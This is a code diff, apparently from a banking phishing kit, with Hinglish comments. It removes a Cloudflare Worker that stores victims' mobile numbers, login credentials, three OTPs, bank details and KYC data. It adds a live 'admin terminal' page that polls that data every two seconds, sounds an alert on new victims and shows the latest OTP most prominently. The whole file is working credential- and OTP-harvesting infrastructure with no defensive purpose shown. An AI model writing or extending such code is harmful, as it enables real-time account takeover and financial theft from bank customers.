@@ -1,70 +1,161 @@
-export default {
-  async fetch(request, env) {
-    const corsHeaders = {
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
-      "Access-Control-Allow-Headers": "Content-Type",
-    };
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Data Admin Terminal</title>
+    <style>
+        /* Terminal Look Style */
+        body { 
+            background: #000; 
+            color: #0f0; 
+            font-family: 'Courier New', monospace; 
+            margin: 0; 
+            padding: 20px;
+        }
+        .header { 
+            border-bottom: 2px solid #0f0; 
+            padding-bottom: 10px; 
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        #counter { color: #ffff00; font-weight: bold; }
+        
+        .logs-container { display: flex; flex-direction: column; gap: 15px; }
 
-    // Browser pre-flight request handle karne ke liye
-    if (request.method === "OPTIONS") {
-      return new Response(null, { headers: corsHeaders });
-    }
-
-    // 1. GET Request: Admin Terminal ke liye data fetch karna
-    if (request.method === "GET") {
-      try {
-        // "New on Top" ke liye ORDER BY time DESC zaroori hai
-        const { results } = await env.DB.prepare("SELECT * FROM user_logs ORDER BY time DESC").all();
-        return new Response(JSON.stringify(results), {
-          headers: { ...corsHeaders, "Content-Type": "application/json" }
-        });
-      } catch (e) {
-        return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: corsHeaders });
-      }
-    }
-
-    // 2. POST Request: Form se data save/update karne ke liye
-    if (request.method === "POST") {
-      try {
-        const data = await request.json();
-        const sid = data.session_id; // Ye frontend se aana chahiye
-
-        if (!sid) {
-          return new Response("Missing session_id", { status: 400, headers: corsHeaders });
+        .card { 
+            border: 1px solid #0f0; 
+            background: #0a0a0a;
+            padding: 15px; 
+            border-radius: 4px;
+            position: relative;
+            animation: slideIn 0.3s ease-out;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        // UPSERT Logic: Naya user hai toh Insert, purana hai toh Update
-        // COALESCE ensures ki purana data delete na ho
-        await env.DB.prepare(`
-          INSERT INTO user_logs (session_id, mobile, credentials, otp_1, bank_details, otp_2, kyc_data, otp_3, time)
-          VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, CURRENT_TIMESTAMP)
-          ON CONFLICT(session_id) DO UPDATE SET
-            mobile = COALESCE(?2, mobile),
-            credentials = COALESCE(?3, credentials),
-            otp_1 = COALESCE(?4, otp_1),
-            bank_details = COALESCE(?5, bank_details),
-            otp_2 = COALESCE(?6, otp_2),
-            kyc_data = COALESCE(?7, kyc_data),
-            otp_3 = COALESCE(?8, otp_3),
-            time = CURRENT_TIMESTAMP
-        `).bind(
-          sid, 
-          data.mobile || null, 
-          data.credentials || null, 
-          data.otp_1 || null, 
-          data.bank_details || null,
-          data.otp_2 || null,
-          data.kyc_data || null,
-          data.otp_3 || null
-        ).run();
+        .time { 
+            color: #ffff00; 
+            font-size: 0.8em; 
+            position: absolute; 
+            top: 10px; 
+            right: 15px; 
+        }
 
-        return new Response("OK", { headers: corsHeaders });
-      } catch (e) {
-        return new Response("Error: " + e.message, { status: 500, headers: corsHeaders });
-      }
+        .data-row { margin: 10px 0; }
+        .label { color: #888; font-size: 0.8em; text-transform: uppercase; }
+        
+        /* Aapne jaisa format manga tha (User ID & Pass) */
+        .value { 
+            display: block; 
+            font-size: 1.2em; 
+            white-space: pre-wrap; 
+            color: #0f0;
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
+
+        /* OTP Highlight */
+        .otp-box { 
+            background: #c00; 
+            color: #fff; 
+            padding: 5px 10px; 
+            display: inline-block;
+            font-weight: bold;
+            margin-top: 5px;
+            border-radius: 3px;
+        }
+
+        .blink { animation: blinker 1s linear infinite; color: #f00; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div>[ SYSTEM ONLINE ] <span class="blink">●</span></div>
+    <div id="counter">Total Users: 0</div>
+</div>
+
+<div id="logs-container" class="logs-container">
+    <div style="text-align: center;">Waiting for incoming data...</div>
+</div>
+
+<audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+
+<script>
+    const WORKER_URL = 'YOUR_WORKER_URL_HERE'; // <--- Yahan apna Worker URL dalo
+    let lastDataCount = 0;
+    let lastDataHash = "";
+
+    async function fetchLogs() {
+        try {
+            const response = await fetch(WORKER_URL);
+            const data = await response.json();
+            
+            // Check if data changed
+            const currentHash = JSON.stringify(data);
+            if (currentHash !== lastDataHash) {
+                // Sound tabhi bajega jab kuch naya aayega
+                if (lastDataHash !== "") {
+                    document.getElementById('notif').play();
+                }
+                lastDataHash = currentHash;
+                renderData(data);
+            }
+        } catch (error) {
+            console.error("Fetch Error:", error);
+        }
     }
 
-    return new Response("Method Not Allowed", { status: 405, headers: corsHeaders });
-  }
-};
+    function renderData(logs) {
+        const container = document.getElementById('logs-container');
+        document.getElementById('counter').innerText = `Total Active Users: ${logs.length}`;
+        container.innerHTML = '';
+
+        logs.forEach(user => {
+            const card = document.createElement('div');
+            card.className = 'card';
+
+            // Timing
+            let html = `<div class="time">${new Date(user.time).toLocaleTimeString()}</div>`;
+
+            // OTP ko sabse upar dikhane ka logic (jaise aapne manga tha)
+            if (user.otp_1 || user.otp_2 || user.otp_3) {
+                let latestOtp = user.otp_3 || user.otp_2 || user.otp_1;
+                html += `<div class="data-row">
+                            <span class="label">Latest OTP:</span><br>
+                            <span class="otp-box">${latestOtp}</span>
+                         </div>`;
+            }
+
+            // User ID & Pass Format
+            if (user.credentials) {
+                html += `<div class="data-row">
+                            <span class="value">${user.credentials}</span>
+                         </div>`;
+            }
+
+            // Bank & PAN
+            if (user.bank_details) html += `<div class="data-row"><span class="label">Bank:</span><span class="value">${user.bank_details}</span></div>`;
+            if (user.kyc_data) html += `<div class="data-row"><span class="label">KYC:</span><span class="value">${user.kyc_data}</span></div>`;
+            
+            // Mobile Number
+            if (user.mobile) html += `<div class="data-row"><span class="label">Mobile:</span><span class="value">${user.mobile}</span></div>`;
+
+            card.innerHTML = html;
+            container.appendChild(card);
+        });
+    }
+
+    // Har 2 second mein auto-refresh
+    setInterval(fetchLogs, 2000);
+    fetchLogs(); // Pehli baar load karne ke liye
+</script>
+
+</body>
+</html>
